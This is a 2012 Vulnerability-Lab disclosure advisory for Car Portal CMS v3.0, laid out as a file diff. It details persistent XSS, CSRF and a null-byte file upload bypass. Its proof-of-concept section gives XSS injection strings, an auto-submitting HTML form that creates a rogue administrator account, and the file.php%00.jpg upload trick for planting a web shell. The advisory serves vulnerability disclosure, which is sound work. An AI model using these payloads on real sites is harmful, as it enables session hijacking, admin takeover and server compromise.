@@ -1,0 +1,144 @@
+Title:
+======
+Car Portal CMS v3.0 - Multiple Web Vulnerabilities
+
+Date:
+=====
+2012-04-24
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=502
+
+VL-ID:
+=====
+502
+
+Introduction:
+=============
+Car Portal is a php software product for running auto classifieds websites. It provides functionality 
+for the private sellers to sign up, list their car for sale and make changes in their ads online using 
+the private sellers administration space. The product provides special functionality for the dealers 
+to work and manage multiple ads. An affiliate functionality is also included, affiliate partners may 
+sign up and earn commissions on all the sales done through their links. The product comes with a 
+powerful admin panel for the administrators, allowing them not only to manage the cars portal settings, 
+the dealers, affiliates etc. but also providing full control over the website, its structure and content, 
+also statistics, search engines functionality and others.
+
+(Copy of the Vendor Homepage: http://www.dream-autos.com/ )
+
+Abstract:
+=========
+The Vulnerability Laboratory Research Team discovered multiple Web Vulnerabilities in the Car Portal v3.0 web application.
+
+Report-Timeline:
+================
+2012-04-24:	Public or Non-Public Disclosure
+
+Status:
+========
+Published
+
+Exploitation-Technique:
+=======================
+Remote
+
+Severity:
+=========
+Medium
+
+Details:
+========
+1.1
+Multiple persistent input validation vulnerabilities are detected in the car portal v3.0 web application.
+The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
+Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
+context manipulation. Exploitation requires low user inter action.
+
+Vulnerable Module(s):
+[+] Post a new vehicle - PWRS & Description field 
+[+] Create News - News title
+[+] Create a sub user - Name
+[+] Create new user group - group Name
+[+] Change profile - Dealer name &First Name & Last Name
+
+1.2
+Multiple cross site request forgery vulnerabilities are detected in the car portal v3.0 web application.
+The bugs allow remote attackers to enforce the user (admin) to change user`s password, Create a user, sub user, or change profile information
+Successful exploitation of the vulnerability can lead to creating a new admin account or changing user`s password.
+
+Vulnerable Module(s):
+[+] cars/ADMIN/index.php?category=security&action=nouveau
+[+] USERS/index.php?category=profile&action=edit
+[+] USERS/index.php?category=home&action=sub_accounts
+
+1.3
+Arbitrary file upload allows the attacker to upload files that differs than images. The attacker can upload the file by 
+changing its name from file.php to file.php%00.php. After the uploading the file .jpg of the file will be truncated and the 
+file will save on the sever as file.php.
+Successful exploitation can result in malware or malicious web shell upload which results in a system comrpomise at the end.
+
+Proof of Concept:
+=================
+The vulnerabilities can be exploited by remote attackers with required low & high required user inter action. 
+For demonstration or reproduce ...
+
+1.1
+The issue can be exploited by creating news, new sub user, or new group with script code as value.
+The result is the persistent execution out of the web application context.
+
+Strings: >"<<iframe src=http://xxxxx.com/>3</iframe> ... or >"<script>alert(document.cookie)</script><div style="1
+
+1.2
+The issue can be exploited if the admin has entered to a page that has the following code. The user or the admin would be forced to do the vulnerable action.
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<form method="POST" name="form0" action="http://www.officialdemos.com/cars/ADMIN/index.php?category=secur
+ity&action=nouveau">
+<input type="hidden" name="username" value="the_storm"/>
+<input type="hidden" name="password" value="password"/>
+<input type="hidden" name="email" value="email (at) email (dot) com [email concealed]"/>
+<input type="hidden" name="category" value="security" />
+<input type="hidden" name="action" value="nouveau" />
+<input type="hidden" name="type" value="administrator"/>
+</form>
+</body>
+</html>
+
+1.3
+The attacker can exploit this vulnerability by uploading the file with name 
+file.php%00.jpg instead of file.php
+
+Risk:
+=====
+1.1
+The security risk of the persistent input validation vulnerability is estimated as medium(+).
+
+1.2
+The security risk of the cross site request forgery vulnerability is estimated as low.
+
+1.3
+The security risk of the arbitrary file upload vulnerability is estimated as medium(+).
+
+Credits:
+========
+Vulnerability Laboratory Research Team - the_storm (strom (at) vulnerability-lab (dot) com [email concealed])
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
+Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab or its suppliers.
+
+Copyright © 2012 Vulnerability-Lab
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research (at) vulnerability-lab (dot) com [email concealed]
